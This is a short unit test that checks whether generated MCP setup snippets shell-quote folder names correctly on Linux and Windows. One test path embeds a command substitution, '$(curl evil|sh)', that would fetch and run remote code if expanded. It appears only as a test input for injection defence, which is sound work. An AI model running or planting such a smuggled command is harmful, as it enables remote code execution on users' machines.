import { describe, expect, it } from "vitest";
import { mcpSnippets } from "./McpSection";

const info = (platform: string) => ({ serverPath: "/app/server.js", runtimePath: "/app/run", dataDir: "/data", platform });

describe("mcpSnippets", () => {
  it("quotes folder names so a pasted command does not expand them", () => {
    const posix = mcpSnippets(info("linux"), ["/home/u/proj-$(curl evil|sh)", "/home/u/it's"], "claude-opus-5-5", "en").claudeCode;
    expect(posix).toContain(`'/home/u/proj-$(curl evil|sh):/home/u/it'\\''s'`);
    const win = mcpSnippets(info("win32"), ["C:\\\\it's $(x)"], "claude-opus-5-5", "en").claudeCode;
    expect(win).toContain(`'C:\\\\it''s $(x)'`);
  });
});
